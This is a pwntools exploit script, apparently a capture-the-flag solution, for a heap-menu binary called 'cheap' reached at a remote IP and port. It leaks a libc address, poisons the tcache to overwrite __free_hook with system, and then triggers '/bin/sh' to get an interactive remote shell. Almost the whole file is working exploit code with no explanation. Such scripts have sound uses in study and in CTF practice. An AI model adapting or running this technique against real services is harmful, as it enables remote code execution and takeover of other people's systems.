from pwn import *

#r = process("./cheap")
#gdb.attach(r)

r = remote("34.146.101.4", 30001)

r.recvuntil(b'Choice:')


def create(size, data):
	r.sendline(b'1')
	r.recvuntil(b'size:')
	r.sendline(str(size))
	r.recvuntil(b'data:')
	r.sendline(data)
	r.recvuntil(b'Choice:')

def show():
	r.sendline(b'2')
	return r.recvuntil(b'Choice:')

def remove():
	r.sendline(b'3')
	r.recvuntil(b'Choice:')


create(0xf0, "1111")
remove()

create(0x200, "2222")
remove()

create(0x300, "3333")
remove()

create(0x10, "4444")



payload = p64(0)*31 + p64(0x521)
create(0xf0, payload)
remove()

create(0x200, "2222")
remove()

payload = "a"*(0x100-1) + "b"
create(0xf0, payload)

stuff = show().split(b'b')[1][:6]
libc_base = int.from_bytes(stuff, "little") - (0x1ebb70 + 0x10 + 96)

print(hex(libc_base))

remove()
payload = b"a"*(0x100-0x10) + p64(0) + p64(0x520)
create(0xf0, payload)



# phase 2

# chunk1
create(0x20, "aaaa")
remove()

# chunk2
payload = p64(0)*(int(0x38/8)) + p64(0x21)
create(0x50, payload)
remove()

# chunk3  - freed
create(0x30, "1111")
remove()

# chunk1
payload = p64(0)*(int(0x28/8)) + p64(0x41)
create(0x20, payload)
remove()

# chunk2  - frees
create(0x50, "1234")
remove()

free_hook = libc_base + 0x1eeb28
system = libc_base + 0x55410

# chunk1

payload = p64(0)*(int(0x28/8)) + p64(0x41) + p64(free_hook)
show()
create(0x20, payload)
remove()


create(0x30, "1234")
create(0x30, p64(system))
show()

create(0x400, b"/bin/sh\x00")
#remove()
r.sendline("3")

r.interactive()